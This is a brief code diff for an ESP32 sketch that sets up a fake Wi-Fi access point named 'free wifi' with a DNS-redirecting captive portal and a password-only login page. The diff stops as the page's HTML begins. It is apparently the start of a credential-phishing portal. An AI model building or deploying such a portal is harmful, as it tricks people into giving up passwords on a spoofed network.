@@ -1,15 +1,16 @@
+//done by muhamad jalal 404
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
 #include <SPIFFS.h>
 
-const char* AP_SSID = "IQtest fake lol";  // AP SSID
+const char* AP_SSID = "free wifi";  //fake AP SSID
 const byte DNS_PORT = 53;
 
 DNSServer dnsServer;
 WebServer server(80);
 
-// Kurdish captive portal login page (password only)
+//  captive portal login page (password only)
 const char* loginPage = 
 R"(
 <!DOCTYPE html>
